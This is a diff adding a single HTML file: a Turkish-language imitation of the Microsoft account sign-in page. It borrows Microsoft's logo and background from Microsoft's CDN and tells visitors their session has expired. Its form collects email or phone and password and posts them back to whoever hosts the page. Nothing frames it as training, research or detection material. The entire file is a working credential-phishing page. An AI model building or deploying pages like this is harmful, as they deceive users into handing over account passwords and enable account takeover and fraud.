@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hesabınıza giriş yapın</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Cherry", "Trebuchet MS", Arial, "Microsoft YaHei", "Meiryo", "Javanese Text", sans-serif;
+      background-color: #f3f2f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg');
+      background-size: cover;
+      background-position: center;
+    }
+    .login-box {
+      background: white;
+      padding: 44px;
+      width: 100%;
+      max-width: 350px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    .logo {
+      height: 24px;
+      margin-bottom: 24px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: #1b1b1b;
+      margin-top: 0;
+    }
+    p.subtitle {
+      font-size: 15px;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 8px 0;
+      border: none;
+      border-bottom: 1px solid #666;
+      font-size: 15px;
+      margin-bottom: 24px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    input[type="email"]:focus, input[type="password"]:focus {
+      border-bottom-color: #0067b8;
+    }
+    .btn-submit {
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      padding: 10px 32px;
+      font-size: 15px;
+      cursor: pointer;
+      float: right;
+    }
+    .btn-submit:hover {
+      background-color: #005da6;
+    }
+    .footer-links {
+      margin-top: 24px;
+      font-size: 13px;
+    }
+    .footer-links a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    .clearfix::after {
+      content: "";
+      clear: both;
+      display: table;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <!-- Base64 Microsoft Logo or hotlink -->
+    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
+    
+    <h1>Giriş yapın</h1>
+    <p class="subtitle">Oturumunuzun süresi doldu. Devam etmek için lütfen giriş yapın.</p>
+    
+    <form action="" method="POST">
+      <input type="email" name="username" placeholder="E-posta, telefon veya Skype" required>
+      <input type="password" name="password" placeholder="Parola" required>
+      
+      <div class="footer-links">
+        <a href="#">Hesabınıza erişemiyor musunuz?</a>
+      </div>
+      
+      <div class="clearfix" style="margin-top: 32px;">
+        <button type="submit" class="btn-submit">İleri</button>
+      </div>
+    </form>
+  </div>
+
+</body>
+</html>
